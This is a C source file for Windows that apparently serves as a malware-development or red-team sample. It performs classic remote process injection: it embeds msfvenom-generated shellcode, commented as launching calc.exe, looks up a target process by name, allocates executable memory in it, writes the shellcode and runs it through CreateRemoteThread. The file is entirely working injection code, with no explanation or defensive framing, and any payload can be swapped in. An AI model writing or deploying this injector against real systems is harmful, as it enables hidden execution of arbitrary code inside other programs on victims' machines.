#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// msfvenom shellcode to execute 64-bit calc.exe
unsigned char payload[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

unsigned int payload_len = sizeof(payload);

int FindProccessIDbyName(const char *proc_name)
{
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    pe.dwSize = sizeof(PROCESSENTRY32);
    hResult = Process32First(hSnapshot, &pe);
    while (hResult)
    {
        if (strcmp(proc_name, (const char *)pe.szExeFile) == 0)
        {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char *argv[])
{
    HANDLE ph; // Process handle
    HANDLE th; // Remote thread handle
    PVOID rb;  // Remote buffer
    int pid = 0;

    if (argc != 2)
    {
        printf("Usage: %s <process name>\n", argv[0]);
        exit(0);
    }

    pid = FindProccessIDbyName(argv[1]);
    if (pid == 0)
    {
        printf("[-] Could not find process %s\n", argv[1]);
        exit(0);
    }
    printf("[+] Found target PID: %d\n", pid);

    // 1. Open target process
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (ph == NULL)
    {
        printf("[-] OpenProcess failed. Error: %d\n", GetLastError());
        return -1;
    }

    // 2. Allocate memory
    rb = VirtualAllocEx(ph, NULL, payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (rb == NULL)
    {
        printf("[-] VirtualAllocEx failed. Error: %d\n", GetLastError());
        CloseHandle(ph);
        return -1;
    }
    printf("[+] Memory allocated at: 0x%p\n", rb);

    // 3. Write memory
    if (!WriteProcessMemory(ph, rb, payload, payload_len, NULL))
    {
        printf("[-] WriteProcessMemory failed. Error: %d\n", GetLastError());
        CloseHandle(ph);
        return -1;
    }

    // 4. Create Remote Thread
    th = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
    if (th == NULL)
    {
        printf("[-] CreateRemoteThread failed. Error: %d\n", GetLastError());
        CloseHandle(ph);
        return -1;
    }

    printf("[+] Success! Remote thread created (TID: %d)\n", GetThreadId(th));

    CloseHandle(ph);
    CloseHandle(th);

    return 0;
}